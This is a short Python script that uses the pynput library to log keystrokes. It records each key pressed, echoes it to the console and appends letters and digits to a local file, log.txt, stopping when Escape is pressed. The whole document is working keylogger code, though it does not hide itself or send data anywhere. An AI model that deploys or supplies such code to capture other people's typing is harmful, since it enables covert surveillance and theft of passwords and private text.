from distutils.file_util import write_file
# pip install pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print('{0} pressed'.format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open('log.txt', 'a') as f: # if you want to recreate put 'w'
        for key in keys:
            k = str(key).replace("'", "")

            if k.find('space') > 0:
                f.write('\n')
            elif k.find('Key') == -1:  # this writes only letters and numbers.
                f.write(k)

def on_release(key):
    if key == Key.esc: # fail safe mech
        return False 

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
